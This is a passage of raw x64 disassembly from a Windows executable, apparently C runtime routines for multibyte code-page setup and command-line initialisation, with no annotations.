   140007fdb:	83 f8 19             	cmp    $0x19,%eax
   140007fde:	77 08                	ja     0x140007fe8
   140007fe0:	80 09 10             	orb    $0x10,(%rcx)
   140007fe3:	8d 42 20             	lea    0x20(%rdx),%eax
   140007fe6:	eb 10                	jmp    0x140007ff8
   140007fe8:	41 83 f8 19          	cmp    $0x19,%r8d
   140007fec:	77 08                	ja     0x140007ff6
   140007fee:	80 09 20             	orb    $0x20,(%rcx)
   140007ff1:	8d 42 e0             	lea    -0x20(%rdx),%eax
   140007ff4:	eb 02                	jmp    0x140007ff8
   140007ff6:	32 c0                	xor    %al,%al
   140007ff8:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   140007ffe:	ff c2                	inc    %edx
   140008000:	48 ff c1             	inc    %rcx
   140008003:	3b d3                	cmp    %ebx,%edx
   140008005:	72 cc                	jb     0x140007fd3
   140008007:	48 8b 8d 70 06 00 00 	mov    0x670(%rbp),%rcx
   14000800e:	48 33 cc             	xor    %rsp,%rcx
   140008011:	e8 7a 5a 00 00       	call   0x14000da90
   140008016:	4c 8d 9c 24 80 07 00 	lea    0x780(%rsp),%r11
   14000801d:	00 
   14000801e:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140008022:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140008026:	49 8b e3             	mov    %r11,%rsp
   140008029:	5d                   	pop    %rbp
   14000802a:	c3                   	ret
   14000802b:	cc                   	int3
   14000802c:	48 8b c4             	mov    %rsp,%rax
   14000802f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140008033:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140008037:	4c 89 48 20          	mov    %r9,0x20(%rax)
   14000803b:	4c 89 40 18          	mov    %r8,0x18(%rax)
   14000803f:	55                   	push   %rbp
   140008040:	57                   	push   %rdi
   140008041:	41 56                	push   %r14
   140008043:	48 8d a8 78 fe ff ff 	lea    -0x188(%rax),%rbp
   14000804a:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   140008051:	44 8a f2             	mov    %dl,%r14b
   140008054:	8b d9                	mov    %ecx,%ebx
   140008056:	49 8b d1             	mov    %r9,%rdx
   140008059:	49 8b c8             	mov    %r8,%rcx
   14000805c:	e8 3b 02 00 00       	call   0x14000829c
   140008061:	8b cb                	mov    %ebx,%ecx
   140008063:	e8 c4 fc ff ff       	call   0x140007d2c
   140008068:	48 8b 8d a0 01 00 00 	mov    0x1a0(%rbp),%rcx
   14000806f:	8b f8                	mov    %eax,%edi
   140008071:	4c 8b 81 88 00 00 00 	mov    0x88(%rcx),%r8
   140008078:	41 3b 40 04          	cmp    0x4(%r8),%eax
   14000807c:	75 07                	jne    0x140008085
   14000807e:	33 c0                	xor    %eax,%eax
   140008080:	e9 fe 01 00 00       	jmp    0x140008283
   140008085:	b9 28 02 00 00       	mov    $0x228,%ecx
   14000808a:	e8 2d 11 00 00       	call   0x1400091bc
   14000808f:	48 8b d8             	mov    %rax,%rbx
   140008092:	48 85 c0             	test   %rax,%rax
   140008095:	75 0f                	jne    0x1400080a6
   140008097:	33 c9                	xor    %ecx,%ecx
   140008099:	e8 4e f4 ff ff       	call   0x1400074ec
   14000809e:	83 c8 ff             	or     $0xffffffff,%eax
   1400080a1:	e9 dd 01 00 00       	jmp    0x140008283
   1400080a6:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   1400080ad:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400080b2:	ba 04 00 00 00       	mov    $0x4,%edx
   1400080b7:	44 8b c2             	mov    %edx,%r8d
   1400080ba:	48 8b 80 88 00 00 00 	mov    0x88(%rax),%rax
   1400080c1:	44 8d 4a 7c          	lea    0x7c(%rdx),%r9d
   1400080c5:	0f 10 00             	movups (%rax),%xmm0
   1400080c8:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400080cc:	0f 11 01             	movups %xmm0,(%rcx)
   1400080cf:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   1400080d3:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400080d7:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   1400080db:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   1400080df:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   1400080e3:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   1400080e7:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   1400080eb:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   1400080ef:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   1400080f3:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   1400080f7:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   1400080fb:	49 03 c1             	add    %r9,%rax
   1400080fe:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140008102:	49 03 c9             	add    %r9,%rcx
   140008105:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140008109:	49 83 e8 01          	sub    $0x1,%r8
   14000810d:	75 b6                	jne    0x1400080c5
   14000810f:	0f 10 00             	movups (%rax),%xmm0
   140008112:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140008116:	48 8b 40 20          	mov    0x20(%rax),%rax
   14000811a:	0f 11 01             	movups %xmm0,(%rcx)
   14000811d:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140008121:	48 89 41 20          	mov    %rax,0x20(%rcx)
   140008125:	48 8b cb             	mov    %rbx,%rcx
   140008128:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000812d:	0f 10 00             	movups (%rax),%xmm0
   140008130:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140008134:	0f 11 01             	movups %xmm0,(%rcx)
   140008137:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   14000813b:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   14000813f:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140008143:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140008147:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   14000814b:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   14000814f:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140008153:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140008157:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   14000815b:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   14000815f:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140008163:	49 03 c1             	add    %r9,%rax
   140008166:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   14000816a:	49 03 c9             	add    %r9,%rcx
   14000816d:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140008171:	48 83 ea 01          	sub    $0x1,%rdx
   140008175:	75 b6                	jne    0x14000812d
   140008177:	0f 10 00             	movups (%rax),%xmm0
   14000817a:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000817e:	48 8b 40 20          	mov    0x20(%rax),%rax
   140008182:	0f 11 01             	movups %xmm0,(%rcx)
   140008185:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140008189:	48 89 41 20          	mov    %rax,0x20(%rcx)
   14000818d:	8b cf                	mov    %edi,%ecx
   14000818f:	21 13                	and    %edx,(%rbx)
   140008191:	48 8b d3             	mov    %rbx,%rdx
   140008194:	e8 37 02 00 00       	call   0x1400083d0
   140008199:	83 cf ff             	or     $0xffffffff,%edi
   14000819c:	8b f0                	mov    %eax,%esi
   14000819e:	3b c7                	cmp    %edi,%eax
   1400081a0:	75 1a                	jne    0x1400081bc
   1400081a2:	e8 ad f2 ff ff       	call   0x140007454
   1400081a7:	48 8b cb             	mov    %rbx,%rcx
   1400081aa:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400081b0:	e8 37 f3 ff ff       	call   0x1400074ec
   1400081b5:	8b c7                	mov    %edi,%eax
   1400081b7:	e9 c7 00 00 00       	jmp    0x140008283
   1400081bc:	45 84 f6             	test   %r14b,%r14b
   1400081bf:	75 05                	jne    0x1400081c6
   1400081c1:	e8 b2 dc ff ff       	call   0x140005e78
   1400081c6:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   1400081cd:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   1400081d4:	8b c7                	mov    %edi,%eax
   1400081d6:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   1400081da:	03 c7                	add    %edi,%eax
   1400081dc:	75 1f                	jne    0x1400081fd
   1400081de:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   1400081e5:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   1400081ec:	48 8d 05 cd 0e 01 00 	lea    0x10ecd(%rip),%rax        # 0x1400190c0
   1400081f3:	48 3b c8             	cmp    %rax,%rcx
   1400081f6:	74 05                	je     0x1400081fd
   1400081f8:	e8 ef f2 ff ff       	call   0x1400074ec
   1400081fd:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140008203:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   14000820a:	48 89 98 88 00 00 00 	mov    %rbx,0x88(%rax)
   140008211:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   140008218:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   14000821e:	85 0d ec 15 01 00    	test   %ecx,0x115ec(%rip)        # 0x140019810
   140008224:	75 54                	jne    0x14000827a
   140008226:	48 8d 85 a0 01 00 00 	lea    0x1a0(%rbp),%rax
   14000822d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140008232:	4c 8d 4c 24 24       	lea    0x24(%rsp),%r9
   140008237:	48 8d 85 a8 01 00 00 	lea    0x1a8(%rbp),%rax
   14000823e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140008243:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140008248:	b8 05 00 00 00       	mov    $0x5,%eax
   14000824d:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140008252:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140008257:	89 44 24 24          	mov    %eax,0x24(%rsp)
   14000825b:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000825f:	e8 f8 f8 ff ff       	call   0x140007b5c
   140008264:	45 84 f6             	test   %r14b,%r14b
   140008267:	74 11                	je     0x14000827a
   140008269:	48 8b 85 a8 01 00 00 	mov    0x1a8(%rbp),%rax
   140008270:	48 8b 08             	mov    (%rax),%rcx
   140008273:	48 89 0d e6 14 01 00 	mov    %rcx,0x114e6(%rip)        # 0x140019760
   14000827a:	33 c9                	xor    %ecx,%ecx
   14000827c:	e8 6b f2 ff ff       	call   0x1400074ec
   140008281:	8b c6                	mov    %esi,%eax
   140008283:	4c 8d 9c 24 70 02 00 	lea    0x270(%rsp),%r11
   14000828a:	00 
   14000828b:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000828f:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140008293:	49 8b e3             	mov    %r11,%rsp
   140008296:	41 5e                	pop    %r14
   140008298:	5f                   	pop    %rdi
   140008299:	5d                   	pop    %rbp
   14000829a:	c3                   	ret
   14000829b:	cc                   	int3
   14000829c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400082a1:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400082a6:	57                   	push   %rdi
   1400082a7:	48 83 ec 20          	sub    $0x20,%rsp
   1400082ab:	48 8b f2             	mov    %rdx,%rsi
   1400082ae:	48 8b f9             	mov    %rcx,%rdi
   1400082b1:	8b 05 59 15 01 00    	mov    0x11559(%rip),%eax        # 0x140019810
   1400082b7:	85 81 a8 03 00 00    	test   %eax,0x3a8(%rcx)
   1400082bd:	74 13                	je     0x1400082d2
   1400082bf:	48 83 b9 90 00 00 00 	cmpq   $0x0,0x90(%rcx)
   1400082c6:	00 
   1400082c7:	74 09                	je     0x1400082d2
   1400082c9:	48 8b 99 88 00 00 00 	mov    0x88(%rcx),%rbx
   1400082d0:	eb 64                	jmp    0x140008336
   1400082d2:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400082d7:	e8 cc 05 00 00       	call   0x1400088a8
   1400082dc:	90                   	nop
   1400082dd:	48 8b 9f 88 00 00 00 	mov    0x88(%rdi),%rbx
   1400082e4:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400082e9:	48 3b 1e             	cmp    (%rsi),%rbx
   1400082ec:	74 3e                	je     0x14000832c
   1400082ee:	48 85 db             	test   %rbx,%rbx
   1400082f1:	74 22                	je     0x140008315
   1400082f3:	83 c8 ff             	or     $0xffffffff,%eax
   1400082f6:	f0 0f c1 03          	lock xadd %eax,(%rbx)
   1400082fa:	83 f8 01             	cmp    $0x1,%eax
   1400082fd:	75 16                	jne    0x140008315
   1400082ff:	48 8d 05 ba 0d 01 00 	lea    0x10dba(%rip),%rax        # 0x1400190c0
   140008306:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000830b:	48 3b c8             	cmp    %rax,%rcx
   14000830e:	74 05                	je     0x140008315
   140008310:	e8 d7 f1 ff ff       	call   0x1400074ec
   140008315:	48 8b 06             	mov    (%rsi),%rax
   140008318:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   14000831f:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140008324:	f0 ff 00             	lock incl (%rax)
   140008327:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000832c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140008331:	e8 c6 05 00 00       	call   0x1400088fc
   140008336:	48 85 db             	test   %rbx,%rbx
   140008339:	74 13                	je     0x14000834e
   14000833b:	48 8b c3             	mov    %rbx,%rax
   14000833e:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140008343:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008348:	48 83 c4 20          	add    $0x20,%rsp
   14000834c:	5f                   	pop    %rdi
   14000834d:	c3                   	ret
   14000834e:	e8 35 e2 ff ff       	call   0x140006588
   140008353:	90                   	nop
   140008354:	48 83 ec 28          	sub    $0x28,%rsp
   140008358:	80 3d 05 1c 01 00 00 	cmpb   $0x0,0x11c05(%rip)        # 0x140019f64
   14000835f:	75 4c                	jne    0x1400083ad
   140008361:	48 8d 0d 98 10 01 00 	lea    0x11098(%rip),%rcx        # 0x140019400
   140008368:	48 89 0d e1 1b 01 00 	mov    %rcx,0x11be1(%rip)        # 0x140019f50
   14000836f:	48 8d 05 4a 0d 01 00 	lea    0x10d4a(%rip),%rax        # 0x1400190c0
   140008376:	48 8d 0d 73 0f 01 00 	lea    0x10f73(%rip),%rcx        # 0x1400192f0
   14000837d:	48 89 05 d4 1b 01 00 	mov    %rax,0x11bd4(%rip)        # 0x140019f58
   140008384:	48 89 0d bd 1b 01 00 	mov    %rcx,0x11bbd(%rip)        # 0x140019f48
   14000838b:	e8 58 e8 ff ff       	call   0x140006be8
   140008390:	4c 8d 0d c1 1b 01 00 	lea    0x11bc1(%rip),%r9        # 0x140019f58
   140008397:	4c 8b c0             	mov    %rax,%r8
   14000839a:	b2 01                	mov    $0x1,%dl
   14000839c:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   1400083a1:	e8 86 fc ff ff       	call   0x14000802c
   1400083a6:	c6 05 b7 1b 01 00 01 	movb   $0x1,0x11bb7(%rip)        # 0x140019f64
   1400083ad:	b0 01                	mov    $0x1,%al
   1400083af:	48 83 c4 28          	add    $0x28,%rsp
   1400083b3:	c3                   	ret
   1400083b4:	48 83 ec 28          	sub    $0x28,%rsp
   1400083b8:	e8 57 e7 ff ff       	call   0x140006b14
   1400083bd:	48 8d 15 94 1b 01 00 	lea    0x11b94(%rip),%rdx        # 0x140019f58
   1400083c4:	48 8b c8             	mov    %rax,%rcx
   1400083c7:	48 83 c4 28          	add    $0x28,%rsp
   1400083cb:	e9 cc fe ff ff       	jmp    0x14000829c
   1400083d0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400083d5:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400083da:	56                   	push   %rsi
   1400083db:	57                   	push   %rdi
   1400083dc:	41 54                	push   %r12
   1400083de:	41 56                	push   %r14
   1400083e0:	41 57                	push   %r15
   1400083e2:	48 83 ec 40          	sub    $0x40,%rsp
   1400083e6:	48 8b 05 53 0c 01 00 	mov    0x10c53(%rip),%rax        # 0x140019040
   1400083ed:	48 33 c4             	xor    %rsp,%rax
   1400083f0:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400083f5:	48 8b f2             	mov    %rdx,%rsi
   1400083f8:	e8 2f f9 ff ff       	call   0x140007d2c
   1400083fd:	33 db                	xor    %ebx,%ebx
   1400083ff:	8b f8                	mov    %eax,%edi
   140008401:	85 c0                	test   %eax,%eax
   140008403:	0f 84 54 02 00 00    	je     0x14000865d
   140008409:	4c 8d 25 00 11 01 00 	lea    0x11100(%rip),%r12        # 0x140019510
   140008410:	44 8b f3             	mov    %ebx,%r14d
   140008413:	49 8b c4             	mov    %r12,%rax
   140008416:	8d 6b 01             	lea    0x1(%rbx),%ebp
   140008419:	39 38                	cmp    %edi,(%rax)
   14000841b:	0f 84 4e 01 00 00    	je     0x14000856f
   140008421:	44 03 f5             	add    %ebp,%r14d
   140008424:	48 83 c0 30          	add    $0x30,%rax
   140008428:	41 83 fe 05          	cmp    $0x5,%r14d
   14000842c:	72 eb                	jb     0x140008419
   14000842e:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   140008434:	0f 84 2d 01 00 00    	je     0x140008567
   14000843a:	0f b7 cf             	movzwl %di,%ecx
   14000843d:	ff 15 25 6d 00 00    	call   *0x6d25(%rip)        # 0x14000f168
   140008443:	85 c0                	test   %eax,%eax
   140008445:	0f 84 1c 01 00 00    	je     0x140008567
   14000844b:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
   140008450:	3b f8                	cmp    %eax,%edi
   140008452:	75 2e                	jne    0x140008482
   140008454:	48 89 46 04          	mov    %rax,0x4(%rsi)
   140008458:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   14000845f:	89 5e 18             	mov    %ebx,0x18(%rsi)
   140008462:	66 89 5e 1c          	mov    %bx,0x1c(%rsi)
   140008466:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   14000846a:	0f b7 c3             	movzwl %bx,%eax
   14000846d:	b9 06 00 00 00       	mov    $0x6,%ecx
   140008472:	66 f3 ab             	rep stos %ax,(%rdi)
   140008475:	48 8b ce             	mov    %rsi,%rcx
   140008478:	e8 c7 f9 ff ff       	call   0x140007e44
   14000847d:	e9 e3 01 00 00       	jmp    0x140008665
   140008482:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140008487:	8b cf                	mov    %edi,%ecx
   140008489:	ff 15 f1 6c 00 00    	call   *0x6cf1(%rip)        # 0x14000f180
   14000848f:	85 c0                	test   %eax,%eax
   140008491:	0f 84 c4 00 00 00    	je     0x14000855b
   140008497:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   14000849b:	33 d2                	xor    %edx,%edx
   14000849d:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400084a3:	e8 48 59 00 00       	call   0x14000ddf0
   1400084a8:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   1400084ad:	89 7e 04             	mov    %edi,0x4(%rsi)
   1400084b0:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1400084b7:	0f 85 94 00 00 00    	jne    0x140008551
   1400084bd:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   1400084c2:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   1400084c6:	74 2c                	je     0x1400084f4
   1400084c8:	38 59 01             	cmp    %bl,0x1(%rcx)
   1400084cb:	74 27                	je     0x1400084f4
   1400084cd:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   1400084d1:	0f b6 11             	movzbl (%rcx),%edx
   1400084d4:	3b d0                	cmp    %eax,%edx
   1400084d6:	77 14                	ja     0x1400084ec
   1400084d8:	2b c2                	sub    %edx,%eax
   1400084da:	8d 7a 01             	lea    0x1(%rdx),%edi
   1400084dd:	8d 14 28             	lea    (%rax,%rbp,1),%edx
   1400084e0:	80 4c 37 18 04       	orb    $0x4,0x18(%rdi,%rsi,1)
   1400084e5:	03 fd                	add    %ebp,%edi
   1400084e7:	48 2b d5             	sub    %rbp,%rdx
   1400084ea:	75 f4                	jne    0x1400084e0
   1400084ec:	48 83 c1 02          	add    $0x2,%rcx
   1400084f0:	38 19                	cmp    %bl,(%rcx)
   1400084f2:	75 d4                	jne    0x1400084c8
   1400084f4:	48 8d 46 1a          	lea    0x1a(%rsi),%rax
   1400084f8:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   1400084fd:	80 08 08             	orb    $0x8,(%rax)
   140008500:	48 03 c5             	add    %rbp,%rax
   140008503:	48 2b cd             	sub    %rbp,%rcx
   140008506:	75 f5                	jne    0x1400084fd
   140008508:	8b 4e 04             	mov    0x4(%rsi),%ecx
   14000850b:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   140008511:	74 2e                	je     0x140008541
   140008513:	83 e9 04             	sub    $0x4,%ecx
   140008516:	74 20                	je     0x140008538
   140008518:	83 e9 0d             	sub    $0xd,%ecx
   14000851b:	74 12                	je     0x14000852f
   14000851d:	3b cd                	cmp    %ebp,%ecx
   14000851f:	74 05                	je     0x140008526
   140008521:	48 8b c3             	mov    %rbx,%rax
   140008524:	eb 22                	jmp    0x140008548
   140008526:	48 8b 05 63 82 00 00 	mov    0x8263(%rip),%rax        # 0x140010790
   14000852d:	eb 19                	jmp    0x140008548
   14000852f:	48 8b 05 52 82 00 00 	mov    0x8252(%rip),%rax        # 0x140010788
   140008536:	eb 10                	jmp    0x140008548
   140008538:	48 8b 05 41 82 00 00 	mov    0x8241(%rip),%rax        # 0x140010780
   14000853f:	eb 07                	jmp    0x140008548
   140008541:	48 8b 05 30 82 00 00 	mov    0x8230(%rip),%rax        # 0x140010778
   140008548:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   14000854f:	eb 02                	jmp    0x140008553
   140008551:	8b eb                	mov    %ebx,%ebp
   140008553:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140008556:	e9 0b ff ff ff       	jmp    0x140008466
   14000855b:	39 1d ff 19 01 00    	cmp    %ebx,0x119ff(%rip)        # 0x140019f60
   140008561:	0f 85 f6 00 00 00    	jne    0x14000865d
   140008567:	83 c8 ff             	or     $0xffffffff,%eax
   14000856a:	e9 f8 00 00 00       	jmp    0x140008667
   14000856f:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   140008573:	33 d2                	xor    %edx,%edx
   140008575:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   14000857b:	e8 70 58 00 00       	call   0x14000ddf0
   140008580:	41 8b c6             	mov    %r14d,%eax
   140008583:	4d 8d 4c 24 10       	lea    0x10(%r12),%r9
   140008588:	4c 8d 3d 71 0f 01 00 	lea    0x10f71(%rip),%r15        # 0x140019500
   14000858f:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140008595:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   140008599:	49 c1 e3 04          	shl    $0x4,%r11
   14000859d:	4d 03 cb             	add    %r11,%r9
   1400085a0:	49 8b d1             	mov    %r9,%rdx
   1400085a3:	41 38 19             	cmp    %bl,(%r9)
   1400085a6:	74 3e                	je     0x1400085e6
   1400085a8:	38 5a 01             	cmp    %bl,0x1(%rdx)
   1400085ab:	74 39                	je     0x1400085e6
   1400085ad:	44 0f b6 02          	movzbl (%rdx),%r8d
   1400085b1:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   1400085b5:	44 3b c0             	cmp    %eax,%r8d
   1400085b8:	77 24                	ja     0x1400085de
   1400085ba:	45 8d 50 01          	lea    0x1(%r8),%r10d
   1400085be:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   1400085c5:	73 17                	jae    0x1400085de
   1400085c7:	41 8a 07             	mov    (%r15),%al
   1400085ca:	44 03 c5             	add    %ebp,%r8d
   1400085cd:	41 08 44 32 18       	or     %al,0x18(%r10,%rsi,1)
   1400085d2:	44 03 d5             	add    %ebp,%r10d
   1400085d5:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   1400085d9:	44 3b c0             	cmp    %eax,%r8d
   1400085dc:	76 e0                	jbe    0x1400085be
   1400085de:	48 83 c2 02          	add    $0x2,%rdx
   1400085e2:	38 1a                	cmp    %bl,(%rdx)
   1400085e4:	75 c2                	jne    0x1400085a8
   1400085e6:	49 83 c1 08          	add    $0x8,%r9
   1400085ea:	4c 03 fd             	add    %rbp,%r15
   1400085ed:	4c 2b f5             	sub    %rbp,%r14
   1400085f0:	75 ae                	jne    0x1400085a0
   1400085f2:	89 7e 04             	mov    %edi,0x4(%rsi)
   1400085f5:	89 6e 08             	mov    %ebp,0x8(%rsi)
   1400085f8:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   1400085fe:	74 29                	je     0x140008629
   140008600:	83 ef 04             	sub    $0x4,%edi
   140008603:	74 1b                	je     0x140008620
   140008605:	83 ef 0d             	sub    $0xd,%edi
   140008608:	74 0d                	je     0x140008617
   14000860a:	3b fd                	cmp    %ebp,%edi
   14000860c:	75 22                	jne    0x140008630
   14000860e:	48 8b 1d 7b 81 00 00 	mov    0x817b(%rip),%rbx        # 0x140010790
   140008615:	eb 19                	jmp    0x140008630
   140008617:	48 8b 1d 6a 81 00 00 	mov    0x816a(%rip),%rbx        # 0x140010788
   14000861e:	eb 10                	jmp    0x140008630
   140008620:	48 8b 1d 59 81 00 00 	mov    0x8159(%rip),%rbx        # 0x140010780
   140008627:	eb 07                	jmp    0x140008630
   140008629:	48 8b 1d 48 81 00 00 	mov    0x8148(%rip),%rbx        # 0x140010778
   140008630:	4c 2b de             	sub    %rsi,%r11
   140008633:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   14000863a:	48 8d 56 0c          	lea    0xc(%rsi),%rdx
   14000863e:	b9 06 00 00 00       	mov    $0x6,%ecx
   140008643:	4b 8d 3c 23          	lea    (%r11,%r12,1),%rdi
   140008647:	0f b7 44 17 f8       	movzwl -0x8(%rdi,%rdx,1),%eax
   14000864c:	66 89 02             	mov    %ax,(%rdx)
   14000864f:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   140008653:	48 2b cd             	sub    %rbp,%rcx
   140008656:	75 ef                	jne    0x140008647
   140008658:	e9 18 fe ff ff       	jmp    0x140008475
   14000865d:	48 8b ce             	mov    %rsi,%rcx
   140008660:	e8 47 f7 ff ff       	call   0x140007dac
   140008665:	33 c0                	xor    %eax,%eax
   140008667:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000866c:	48 33 cc             	xor    %rsp,%rcx
   14000866f:	e8 1c 54 00 00       	call   0x14000da90
   140008674:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140008679:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   14000867d:	49 8b 6b 48          	mov    0x48(%r11),%rbp
   140008681:	49 8b e3             	mov    %r11,%rsp
   140008684:	41 5f                	pop    %r15
   140008686:	41 5e                	pop    %r14
   140008688:	41 5c                	pop    %r12
   14000868a:	5f                   	pop    %rdi
   14000868b:	5e                   	pop    %rsi
   14000868c:	c3                   	ret
   14000868d:	cc                   	int3
   14000868e:	cc                   	int3
   14000868f:	cc                   	int3
   140008690:	48 83 ec 28          	sub    $0x28,%rsp
   140008694:	ff 15 ee 6a 00 00    	call   *0x6aee(%rip)        # 0x14000f188
   14000869a:	48 89 05 e7 18 01 00 	mov    %rax,0x118e7(%rip)        # 0x140019f88
   1400086a1:	ff 15 e9 6a 00 00    	call   *0x6ae9(%rip)        # 0x14000f190
   1400086a7:	48 89 05 e2 18 01 00 	mov    %rax,0x118e2(%rip)        # 0x140019f90
   1400086ae:	b0 01                	mov    $0x1,%al
   1400086b0:	48 83 c4 28          	add    $0x28,%rsp
   1400086b4:	c3                   	ret
   1400086b5:	cc                   	int3
   1400086b6:	cc                   	int3
   1400086b7:	cc                   	int3
   1400086b8:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   1400086be:	77 20                	ja     0x1400086e0
   1400086c0:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   1400086c6:	83 f8 09             	cmp    $0x9,%eax
   1400086c9:	77 0c                	ja     0x1400086d7
   1400086cb:	41 ba a7 02 00 00    	mov    $0x2a7,%r10d
   1400086d1:	41 0f a3 c2          	bt     %eax,%r10d
   1400086d5:	72 05                	jb     0x1400086dc
   1400086d7:	83 f9 2a             	cmp    $0x2a,%ecx
   1400086da:	75 2f                	jne    0x14000870b
   1400086dc:	33 d2                	xor    %edx,%edx
   1400086de:	eb 2b                	jmp    0x14000870b
   1400086e0:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   1400086e6:	74 20                	je     0x140008708
   1400086e8:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   1400086ee:	76 1b                	jbe    0x14000870b
   1400086f0:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   1400086f6:	76 e4                	jbe    0x1400086dc
   1400086f8:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   1400086fe:	74 dc                	je     0x1400086dc
   140008700:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   140008706:	75 03                	jne    0x14000870b
   140008708:	83 e2 08             	and    $0x8,%edx
   14000870b:	48 ff 25 86 6a 00 00 	rex.W jmp *0x6a86(%rip)        # 0x14000f198
   140008712:	cc                   	int3
   140008713:	cc                   	int3
